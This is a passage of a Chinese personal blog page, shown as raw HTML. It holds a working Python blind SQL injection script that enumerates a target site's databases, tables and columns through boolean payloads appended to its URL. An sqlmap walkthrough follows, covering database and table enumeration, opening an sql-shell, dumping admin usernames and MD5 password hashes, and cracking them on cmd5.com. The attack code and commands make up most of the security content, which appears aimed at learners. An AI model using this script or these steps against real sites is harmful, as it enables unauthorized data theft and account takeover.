class="literal">None</span> <span class="keyword">and</span> options.database == <span class="literal">None</span> <span class="keyword">and</span> options.table == <span class="literal">None</span> <span class="keyword">and</span> options.column == <span class="literal">None</span>:</span><br><span class="line">        print(<span class="string">"Please read the help"</span>)</span><br><span class="line">        parser.print_help()</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">elif</span> options.url != <span class="literal">None</span> <span class="keyword">and</span> options.database ==<span class="literal">None</span> <span class="keyword">and</span> options.table == <span class="literal">None</span> <span class="keyword">and</span> options.column == <span class="literal">None</span>:</span><br><span class="line">        get_all_databases(options.url)</span><br><span class="line">    <span class="keyword">elif</span>  options.url != <span class="literal">None</span> <span class="keyword">and</span> options.database !=<span class="literal">None</span> <span class="keyword">and</span> options.table == <span class="literal">None</span> <span class="keyword">and</span> options.column == <span class="literal">None</span>:</span><br><span class="line">        get_db_all_tables(options.url,options.database)</span><br><span class="line">    <span class="keyword">elif</span>  options.url != <span class="literal">None</span> <span class="keyword">and</span> options.database !=<span class="literal">None</span> <span class="keyword">and</span> options.table != <span class="literal">None</span> <span class="keyword">and</span> options.column == <span class="literal">None</span>:</span><br><span class="line">        get_db_tb_all_columns(options.url,options.database,options.table)</span><br><span class="line">    <span class="keyword">elif</span>  options.url != <span class="literal">None</span> <span class="keyword">and</span> options.database !=<span class="literal">None</span> <span class="keyword">and</span> options.table != <span class="literal">None</span> <span class="keyword">and</span> options.column != <span class="literal">None</span>:</span><br><span class="line">        getAllContent(options.url,options.database,options.table,options.column)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">http_get</span><span class="params">(url)</span>:</span></span><br><span class="line">    result = requests.get(url)</span><br><span class="line">    <span class="keyword">return</span> result.content</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_databases</span><span class="params">(url)</span>:</span></span><br><span class="line">	db_nums_payload = <span class="string">"select count(schema_name) from information_schema.schemata"</span></span><br><span class="line">	db_numbers = half(url,db_nums_payload)</span><br><span class="line">	print(<span class="string">"数据库的总个数为：%d"</span> % db_numbers)</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> range(db_numbers):</span><br><span class="line">		db_len_payload = <span class="string">"select length(schema_name) from information_schema.schemata limit %d,1"</span> % x</span><br><span class="line">		db_name_numbers = half(url,db_len_payload)</span><br><span class="line"></span><br><span class="line">		db_name = <span class="string">""</span></span><br><span class="line">		<span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">1</span>,db_name_numbers+<span class="number">1</span>):</span><br><span class="line">		 	</span><br><span class="line">		 	db_name_payload = <span class="string">"ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))"</span> % (x,y)</span><br><span class="line">		 	db_name += chr(half(url,db_name_payload))</span><br><span class="line"></span><br><span class="line">		print(<span class="string">"第%d个数据库为：%s"</span> % (x+<span class="number">1</span>,db_name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取指定数据库中的表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_db_all_tables</span><span class="params">(url,database)</span>:</span></span><br><span class="line">    tb_nums_payload = <span class="string">"select count(table_name) from information_schema.tables where table_schema = '%s'"</span> % database</span><br><span class="line">    tb_numbers = half(url,tb_nums_payload)</span><br><span class="line">    print(<span class="string">"%s数据库中的表个数为：%d"</span> % (database,tb_numbers))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(tb_numbers):</span><br><span class="line">        tb_len_payload  = <span class="string">"select length(table_name) from information_schema.tables where table_schema = '%s' limit %d,1"</span> % (database,x)</span><br><span class="line">        </span><br><span class="line">        tb_name_numbers = half(url,tb_len_payload)</span><br><span class="line">        <span class="comment"># print(tb_name_numbers)</span></span><br><span class="line">        tb_name = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">1</span>,tb_name_numbers+<span class="number">1</span>):</span><br><span class="line">            </span><br><span class="line">            tb_name_payload = <span class="string">"ascii(substr((select table_name from information_schema.tables where table_schema = '%s' limit %d,1),%d,1))"</span> % (database,x,y)</span><br><span class="line">            <span class="comment"># print(tb_name_payload)                </span></span><br><span class="line">            tb_name += chr(half(url,tb_name_payload))</span><br><span class="line">            <span class="comment"># print(tb_name)</span></span><br><span class="line">        print(database,<span class="string">"数据库中第%d个表为：%s"</span> % (x+<span class="number">1</span>,tb_name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取指定数据库中指定表的字段 </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_db_tb_all_columns</span><span class="params">(url,database,table)</span>:</span></span><br><span class="line">    co_nums_payload = <span class="string">"select count(column_name) from information_schema.columns where table_schema = '%s' and table_name = '%s'"</span> % (database,table)</span><br><span class="line">    co_numbers = half(url,co_nums_payload)</span><br><span class="line">    print(<span class="string">"%s 数据库中的 %s 表中的字段个数为：%d"</span> % (database,table,co_numbers))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(co_numbers):</span><br><span class="line">        co_len_payload  = <span class="string">"select length(column_name) from information_schema.columns where table_schema = '%s' and table_name = '%s' limit %d,1"</span> % (database,table,x)</span><br><span class="line">        co_name_numbers = half(url,co_len_payload)</span><br><span class="line"></span><br><span class="line">        co_name = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">1</span>,co_name_numbers+<span class="number">1</span>):</span><br><span class="line">            </span><br><span class="line">            co_name_payload = <span class="string">"ascii(substr((select column_name from information_schema.columns where table_schema = '%s' and table_name = '%s' limit %d,1),%d,1))"</span> % (database,table,x,y)</span><br><span class="line">            co_name += chr(half(url,co_name_payload))</span><br><span class="line"></span><br><span class="line">        print(database,<span class="string">"数据库中"</span>,table,<span class="string">"表中第%d个字段名为：%s"</span> % (x+<span class="number">1</span>,co_name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取指定数据库中指定表中指定字段内容</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAllContent</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#python里面没有MD5加密函数，需要自己写</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(str)</span>:</span></span><br><span class="line">    hl = hashlib.md5()</span><br><span class="line">    hl.update(str)</span><br><span class="line">    <span class="keyword">return</span> hl.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#二分法函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half</span><span class="params">(url,payload)</span>:</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">126</span></span><br><span class="line">    standard_html = md5(http_get(url))</span><br><span class="line">    <span class="comment"># print(standard_html)</span></span><br><span class="line">    <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">        mid=(low + high)/<span class="number">2</span></span><br><span class="line">        mid_num_payload = url + <span class="string">" and (%s) &gt; %d-- "</span> % (payload,mid)</span><br><span class="line">        <span class="comment"># print(mid_num_payload)</span></span><br><span class="line">        mid_html = md5(http_get(mid_num_payload))</span><br><span class="line">        <span class="comment">#print(mid_html)</span></span><br><span class="line">        <span class="keyword">if</span> mid_html == standard_html:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid - <span class="number">1</span> </span><br><span class="line">    mid_num = int((low+high+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> mid_num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()；</span><br></pre></td></tr></table></figure>
+
+<h1 id="SQLMAP使用总结"><a href="#SQLMAP使用总结" class="headerlink" title="SQLMAP使用总结"></a>SQLMAP使用总结</h1><h2 id="安装SQLMap"><a href="#安装SQLMap" class="headerlink" title="安装SQLMap"></a>安装SQLMap</h2><p>安装python2.7</p>
+<p>拷贝SQLMap目录</p>
+<p>cmd进入SQLMap目录运行SQLMap</p>
+<h2 id="GET数字型注入利用过程示范"><a href="#GET数字型注入利用过程示范" class="headerlink" title="GET数字型注入利用过程示范"></a>GET数字型注入利用过程示范</h2><h3 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h3><p>截取访问连接：</p>
+<p>得到注入点：<a href="http://xxxx" target="_blank" rel="noopener">http://xxxx</a></p>
+<h3 id="查询库名"><a href="#查询库名" class="headerlink" title="查询库名"></a>查询库名</h3><p>打开cmd，切换当前目录到D:\SQLMAP\</p>
+<p>执行命令：python sqlmap.py -u “注入点” –current-db</p>
+<h3 id="指定库名查表名"><a href="#指定库名查表名" class="headerlink" title="指定库名查表名"></a>指定库名查表名</h3><p>执行命令：python sqlmap.py -u “注入点” -D 库名 –table</p>
+<h3 id="指定库名、表名查列名"><a href="#指定库名、表名查列名" class="headerlink" title="指定库名、表名查列名"></a>指定库名、表名查列名</h3><p>执行命令：python sqlmap.py -u “注入点” -D 库名 -T 表名 –column</p>
+<h3 id="获取sql-shell"><a href="#获取sql-shell" class="headerlink" title="获取sql-shell"></a>获取sql-shell</h3><p>执行命令：python sqlmap.py -u “注入点” –sql-shell</p>
+<p>获得sql-shell提示符</p>
+<h3 id="查记录"><a href="#查记录" class="headerlink" title="查记录"></a>查记录</h3><p>前面步骤获取到表结构后，在sql-shell提示符后面输入SQL语句查询记录：</p>
+<p>select username, password from t_admin;</p>
+<p>获得管理员账号记录：</p>
+<p>账号：admin</p>
+<p>md5（密码）：xxxx</p>
+<h3 id="反查密码"><a href="#反查密码" class="headerlink" title="反查密码"></a>反查密码</h3><p>访问cmd5.com，输入md5（密码）查询，得知密码为：xxx</p>
+<h2 id="POST注入利用方式"><a href="#POST注入利用方式" class="headerlink" title="POST注入利用方式"></a>POST注入利用方式</h2><h3 id="方式一：–form"><a href="#方式一：–form" class="headerlink" title="方式一：–form"></a>方式一：–form</h3><h3 id="方式二：–data-“var1-parm1-amp-var2-parm2”"><a href="#方式二：–data-“var1-parm1-amp-var2-parm2”" class="headerlink" title="方式二：–data “var1=parm1&amp;var2=parm2”"></a>方式二：–data “var1=parm1&amp;var2=parm2”</h3><h3 id="方式三：-r-“request-txt”"><a href="#方式三：-r-“request-txt”" class="headerlink" title="方式三：-r “request.txt”"></a>方式三：-r “request.txt”</h3>
+      
+    </div>
+    <footer>
+      
+        
+  
+  <div class="categories">
+    <a href="/categories/安全/">安全</a>, <a href="/categories/安全/web/">web</a>
+  </div>
+
+        
+        
+  <div class="bdsharebuttonbox"><a href="#" class="bds_more" data-cmd="more"></a><a title="分享到QQ空间" href="#" class="bds_qzone" data-cmd="qzone"></a><a title="分享到新浪微博" href="#" class="bds_tsina" data-cmd="tsina"></a><a title="分享到腾讯微博" href="#" class="bds_tqq" data-cmd="tqq"></a><a title="分享到人人网" href="#" class="bds_renren" data-cmd="renren"></a><a title="分享到微信" href="#" class="bds_weixin" data-cmd="weixin"></a></div>
+  <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},"share":{},"image":{"viewList":["qzone","tsina","tqq","renren","weixin"],"viewText":"分享到：","viewSize":"16"},"selectShare":{"bdContainerClass":null,"bdSelectMiniList":["qzone","tsina","tqq","renren","weixin"]}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+<!-- 返回顶部 -->
+<div id="toTop">
+	<a href="#">▲</a>
+	<a href="#footer">▼</a>
+</div></div></div>
+      <aside id="sidebar" class="alignright">
+        
+           <div class="search">
+  <form action="/search/index.html" method="get" accept-charset="utf-8">
+<!--     <input type="search" name="wd"results="0" placeholder="搜索">
+    <input type="hidden" name="wd" value="site:yoursite.com"> -->
+     <input type="text" id="search" class="st-default-search-input" placeholder="搜索" style="height: 100%" />
+  </form>
+</div> 
+        
+          
+<div class="widget tag">
+  <h3 class="title" id="categories">分类</h3>
+     <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/C/">C</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Cyber-Security/">Cyber Security</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux-C/">Linux C</a><span class="category-list-count">15</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Linux-C/IPC/">IPC</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux-C/多线程/">多线程</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux-C/多路I-O复用/">多路I/O复用</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux-C/网络编程/">网络编程</a><span class="category-list-count">6</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/">OS</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/">PWN</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/blockchain/">blockchain</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/dairy/">dairy</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/data-mining/">data mining</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/machine-learning/">machine learning</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/math/">math</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/math/linear-algebra/">linear algebra</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/summary/">summary</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/“各种”系列/">“各种”系列</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全/">安全</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/安全/web/">web</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/开发日志/">开发日志</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/思考/">思考</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/恶意代码分析/">恶意代码分析</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/正则/">正则</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/程序员的自我修养/">程序员的自我修养</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/网络/">网络</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/读书笔记/">读书笔记</a><span class="category-list-count">1</span></li></ul> 
+</div>
+ 
+
+        
+          <div class="widget tag">
+  <h3 class="title">微信公众账号</h3>
+    <ul class="entry">
+      <img src="/img/default/qrcode.jpg" alt="欢迎关注个人公众账号" style= "width: 100%">
+    </ul>
+</div>
+        
+          <div class="widget tag">
+  <h3 class="title">日历云</h3>
+  <div id="calendar"></div>
+</div>
+
+        
+          
+  <div class="widget tag">
+    <h3 class="title">友情链接</h3>
+      <ul class="entry">
+        
+          <li class='link'><a href=''>(tool)</a></li>
+        
+          <li class='link'><a href='https://www.mathsisfun.com/'>MathIsFun</a></li>
+        
+          <li class='link'><a href='https://www.shuxuele.com/index.html'>数学乐</a></li>
+        
+          <li class='link'><a href=''>(blog)</a></li>
+        
+          <li class='link'><a href='https://hpasserby.me/'>一个bin菜鸡</a></li>
+        
+          <li class='link'><a href='https://blog.csdn.net/ljianhui'>初学Linux</a></li>
+        
+          <li class='link'><a href='https://zzqcn.github.io/opensource/dpdk/index.html#'>赵子清(dpdk)</a></li>
+        
+          <li class='link'><a href='https://www.laojiyou.com/books/sdnwlzn/reference.html'>SDN网络指南</a></li>
+        
+          <li class='link'><a href='https://www.cnblogs.com/zengzy'>曾志优(数据结构与算法)</a></li>
+        
+          <li class='link'><a href='https://www.cnblogs.com/bonelee/tag/安全分析/'>安全分析</a></li>
+        
+          <li class='link'><a href='https://blog.csdn.net/houyanhua1'>WEB</a></li>
+        
+          <li class='link'><a href=''>(empty)</a></li>
+        
+          <li class='link'><a href='https://www.sdnlab.com/'>SDNLAB</a></li>
+        
+          <li class='link'><a href='https://medium.com/'>Medium</a></li>
+        
+          <li class='link'><a href='https://mooc.study.163.com/smartSpec/detail/1001319001.htm?from=study'>深度学习微专业</a></li>
+        
+          <li class='link'><a href=''>(book)</a></li>
+        
+          <li class='link'><a href='chrome-extension://cdonnmffkdaoajfknoeeecmchibpmkmg/static/pdf/web/viewer.html?file=http%3A%2F%2Fpdf.ebook23.com%2Febook%2F19_%25E7%25A8%258B%25E5%25BA%258F%25E5%2591%2598%25E4%25B8%25AA%25E4%25BA%25BA%25E4%25BF%25AE%25E5%2585%25BB%2F%255B%25E4%25BB%25A3%25E7%25A0%2581%25E5%25A4%25A7%25E5%2585%25A82%25E4%25B8%25AD%25E6%2596%2587%25E7%2589%2588%2528%25E5%25AE%258C%25E6%2595%25B4%25E6%25B8%2585%25E6%2599%25B0%25E7%2589%2588%2529%255D.pdf'>代码大全</a></li>
+        
+      </ul>
+  </div>
+
+
+        
+          
+  <div class="widget tag">
+    <h3 class="title">归档</h3>
+	<ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">公元 2019 年</a><span class="archive-list-count">99</span></li></ul>
+  </div>
+
+        
+      </aside>
+      <div class="clearfix"></div>
+    </div>
+  <footer id="footer"><div class="footer-content inner">
+  <div class="alignleft">
+  
+    &copy; 2019 cendeavor
+    
+  </div>
+  <div class="alignright">
+    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>, Theme
+    <a href="https://github.com/pengloo53/Hexo-theme-light_cn">light_cn</a>
+  </div>
+
+  <div>
+    Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>
+  </div>
+  
+  <div class="clearfix"></div>
+</div></footer>
+  <script src="/js/jquery.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+<!-- calendar widget -->
+
+  <script src="/js/calendar.js"></script>
+  <script src="/js/languages.js"></script>
+  <script type="text/javascript">
+    $(function() {
+    
+      $('#calendar').aCalendar('zh-CN',{single:, root:'calendar'});
+    
+    });
+  </script>
+
+
+<!-- 百度统计 -->
+
+	<script>
+	var _hmt = _hmt || [];
+	(function() {
+	  var hm = document.createElement("script");
+	  hm.src = "//hm.baidu.com/hm.js?9acf0cedd48dc53be256ede5a98c2aaa";
+	  var s = document.getElementsByTagName("script")[0]; 
+	  s.parentNode.insertBefore(hm, s);
+	})();
+	</script>
+
+
+<!-- fancybox -->
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+<!-- swiftype -->
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+  
+  _st('install','HcqxzAQHLZzGwtjJSqw3','2.0.0');
+</script>
+</body>
+</html>
